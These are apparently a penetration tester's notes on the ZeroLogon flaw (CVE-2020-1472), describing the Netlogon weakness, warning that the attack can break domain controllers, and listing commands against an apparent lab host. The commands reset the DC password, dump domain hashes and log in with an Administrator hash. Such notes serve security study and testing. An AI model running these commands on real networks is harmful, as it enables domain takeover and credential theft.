---
description: 10-1-2022
---

# ZeroLogon Exploit

## CVE-2020-1472 (A.K.A. ZeroLogon)

### "Instantly become Domain Admin by subverting Netlogon Cryptography"

This exploit stems from a <mark style="color:yellow;">vulnerability</mark> in the <mark style="color:yellow;">Netlogon Remote Protocol</mark>

* This exploit stems from <mark style="color:yellow;">cryptographic authentication flaws</mark>
* This is a pretty nasty vulnerability
* This will allow an attacker to impersonate any computer (such as the domain controller)
* You will be able to delete the hash/password from the user and authenticate without a password
* The attacker must have a foothold within your network and a connection to the Domain Controller must be possible

## Warning <mark style="color:yellow;">Please</mark> Read

* This attack will absolutely destroy the Domain Controller
* It is paramount that you understand how to restore the DC after you run this attack or if you choose to not run this attack at all on a real client
* If you are using this in a real environment, consider running the test tool against the DC and immediately notifying the client that they need to patch this!

## Technical Details

How does it work exactly?

* The attacker must forge an authentication token for specific Netlogon functionality
* Call a function to establish the computer password of the Domain Controller to a known value
* Once this is done, the attacker can use this new password to take control over the DC and steal credentials of a Domain Admin
* Once achieved, the attacker can execute RPC's to all workstations across the Domain

{% embed url="https://github.com/risksense/zerologon" %}
PoC
{% endembed %}

{% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}
PoC
{% endembed %}

{% embed url="https://github.com/SecuraBV/CVE-2020-1472" %}
Tester
{% endembed %}

## Exploitation

Step 1: Clone the repo and obtain CVE PoC

Step 2: Run the PoC

```
python3 set_empty_pw.py Resolute 10.129.60.74
```

Step 3: Dump the domain with impacket-secretsdump

```
impacket-secretsdump -just-dc megabank.local/Resolute\$@10.129.60.74
```

Step 4: Copy the Administrator's hash and use wmiexec to Access the DC

```
impacket-wmiexec megabank.local/Administrator@10.129.60.74 -hashes aad3b435b51404eeaad3b435b51404ee:fb3b106896cdaa8a08072775fbd9afe9
```
